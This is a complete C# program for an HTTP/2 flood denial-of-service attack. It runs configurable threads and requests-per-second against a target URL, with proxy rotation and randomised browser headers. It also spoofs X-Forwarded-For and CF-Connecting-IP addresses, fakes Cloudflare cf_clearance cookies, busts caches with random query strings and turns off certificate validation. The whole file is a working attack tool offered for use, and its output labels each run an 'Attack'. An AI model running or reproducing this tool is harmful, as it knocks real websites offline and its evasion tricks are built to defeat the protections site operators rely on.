// Http2Flood.cs
// Usage: Http2Flood.exe <target> <time> <rps> <threads> <proxyfile>
// Example: Http2Flood.exe https://example.com 60 1000 10 proxies.txt

using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class Http2Flood
{
    static readonly Random _rand = new Random();
    static string[] _proxies = Array.Empty<string>();

    // Header collections (same as Node.js version)
    static readonly string[] _acceptHeaders =
    {
        "*/*", "image/*", "image/webp,image/apng", "text/html",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"
    };

    static readonly string[] _langHeaders =
    {
        "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH,fr;q=0.9,en;q=0.8,de;q=0.7,*;q=0.5",
        "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7", "da,en-gb;q=0.8,en;q=0.7", "cs;q=0.5",
        "en-US,en;q=0.9", "en-GB,en;q=0.9", "en-CA,en;q=0.9", "en-AU,en;q=0.9", "en-NZ,en;q=0.9",
        "en-ZA,en;q=0.9", "en-IE,en;q=0.9", "en-IN,en;q=0.9"
    };

    static readonly string[] _encodingHeaders =
    {
        "gzip", "gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity",
        "gzip, deflate", "br", "deflate"
    };

    static readonly string[] _referers =
    {
        "https://www.google.com", "https://www.facebook.com", "https://www.twitter.com",
        "https://www.youtube.com", "https://www.amazon.com", "https://www.netflix.com",
        "https://www.instagram.com", "https://www.yahoo.com", "https://www.stackoverflow.com",
        "https://www.github.com", "https://www.linkedin.com", "https://www.cnn.com"
    };

    static readonly string[] _userAgents =
    {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
    };

    static string RandomElement(string[] arr) => arr[_rand.Next(arr.Length)];
    static string RandomString(int len) => Path.GetRandomFileName().Replace(".", "").Substring(0, len);

    static async Task Main(string[] args)
    {
        if (args.Length < 5)
        {
            Console.WriteLine("Usage: Http2Flood.exe <target> <time> <rps> <threads> <proxyfile>");
            return;
        }

        string target = args[0];
        int durationSec = int.Parse(args[1]);
        int ratePerThread = int.Parse(args[2]);    // requests per second per thread
        int threads = int.Parse(args[3]);
        string proxyFile = args[4];

        if (File.Exists(proxyFile))
            _proxies = File.ReadAllLines(proxyFile).Where(l => !string.IsNullOrWhiteSpace(l) && !l.StartsWith("#") && l.Contains(':')).ToArray();
        else
            Console.WriteLine("[!] Proxy file not found. Using direct connection (no proxy).");

        Console.WriteLine($"\n[🔥] HTTP/2 Flood | Target: {target} | Duration: {durationSec}s");
        Console.WriteLine($"     Threads: {threads} | Rate/thread: {ratePerThread} req/s | Total RPS: {threads * ratePerThread}");
        Console.WriteLine($"     Proxies loaded: {_proxies.Length}");

        var cts = new CancellationTokenSource();
        var tasks = new Task[threads];
        var perThreadCounters = new ConcurrentDictionary<int, long>();

        var parsedTarget = new Uri(target);
        var handler = new SocketsHttpHandler
        {
            PooledConnectionLifetime = TimeSpan.FromMinutes(2),
            PooledConnectionIdleTimeout = TimeSpan.FromSeconds(30),
            MaxConnectionsPerServer = 256,
            EnableMultipleHttp2Connections = true,
            UseProxy = false, // we'll handle proxy manually
            SslOptions = new SslClientAuthenticationOptions
            {
                RemoteCertificateValidationCallback = (sender, cert, chain, errors) => true
            }
        };

        for (int i = 0; i < threads; i++)
        {
            int threadId = i;
            perThreadCounters[threadId] = 0;
            tasks[i] = Task.Run(() => Worker(threadId, parsedTarget, durationSec, ratePerThread, cts.Token, perThreadCounters));
        }

        // RPS monitor
        var monitor = Task.Run(async () =>
        {
            while (!cts.Token.IsCancellationRequested)
            {
                await Task.Delay(1000);
                foreach (var kv in perThreadCounters)
                {
                    long count = kv.Value;
                    if (count > 0)
                        Console.WriteLine($"[Worker {kv.Key}] RPS: {count}");
                    perThreadCounters[kv.Key] = 0;
                }
            }
        });

        await Task.Delay(durationSec * 1000);
        cts.Cancel();
        await Task.WhenAll(tasks);
        await monitor;
        Console.WriteLine("\n[⏹️] Attack finished.");
    }

    static async Task Worker(int id, Uri target, int durationSec, int rate, CancellationToken ct, ConcurrentDictionary<int, long> counter)
    {
        // Select a random proxy for this worker (if any)
        string proxy = _proxies.Length > 0 ? _proxies[_rand.Next(_proxies.Length)] : null;

        var handler = new SocketsHttpHandler
        {
            PooledConnectionLifetime = TimeSpan.FromMinutes(2),
            PooledConnectionIdleTimeout = TimeSpan.FromSeconds(30),
            MaxConnectionsPerServer = 256,
            EnableMultipleHttp2Connections = true,
            SslOptions = new SslClientAuthenticationOptions
            {
                RemoteCertificateValidationCallback = (sender, cert, chain, errors) => true
            }
        };

        if (proxy != null)
        {
            var proxyParts = proxy.Split(':');
            handler.Proxy = new WebProxy(proxyParts[0], int.Parse(proxyParts[1]));
            handler.UseProxy = true;
        }

        using var client = new HttpClient(handler);
        client.DefaultRequestHeaders.ConnectionClose = false;
        client.DefaultRequestHeaders.Add("User-Agent", RandomElement(_userAgents));
        client.DefaultRequestHeaders.Add("Accept", RandomElement(_acceptHeaders));
        client.DefaultRequestHeaders.Add("Accept-Language", RandomElement(_langHeaders));
        client.DefaultRequestHeaders.Add("Accept-Encoding", RandomElement(_encodingHeaders));
        client.DefaultRequestHeaders.Add("Referer", RandomElement(_referers));
        client.DefaultRequestHeaders.Add("Cache-Control", "no-cache");
        client.DefaultRequestHeaders.Add("Upgrade-Insecure-Requests", "1");
        client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "navigate");
        client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "document");
        client.DefaultRequestHeaders.Add("Sec-Fetch-User", "?1");
        client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "cross-site");
        client.DefaultRequestHeaders.Add("X-Forwarded-For", $"{_rand.Next(255)}.{_rand.Next(255)}.{_rand.Next(255)}.{_rand.Next(255)}");
        client.DefaultRequestHeaders.Add("CF-Connecting-IP", $"{_rand.Next(255)}.{_rand.Next(255)}.{_rand.Next(255)}.{_rand.Next(255)}");
        client.DefaultRequestHeaders.Add("Cookie", $"cf_clearance={RandomString(4)}.{RandomString(20)}.{RandomString(40)}-0.0.1; _ga={RandomString(20)}; _gid={RandomString(15)}");

        var stopwatch = Stopwatch.StartNew();
        int intervalMs = 1000 / rate;
        int requestCount = 0;

        while (!ct.IsCancellationRequested && stopwatch.Elapsed.TotalSeconds < durationSec)
        {
            // Add random query parameter to avoid caching
            string url = target.ToString();
            if (!url.Contains('?'))
                url += "?";
            else
                url += "&";
            url += $"_={RandomString(10)}";

            try
            {
                using var response = await client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead, ct);
                requestCount++;
                counter.AddOrUpdate(id, 1, (_, old) => old + 1);
                await response.Content.ReadAsStreamAsync(ct).ContinueWith(t => t.Result?.Dispose());
            }
            catch { }

            await Task.Delay(intervalMs, ct);
        }

        Console.WriteLine($"[Worker {id}] Finished. Total requests: {requestCount}");
    }
}
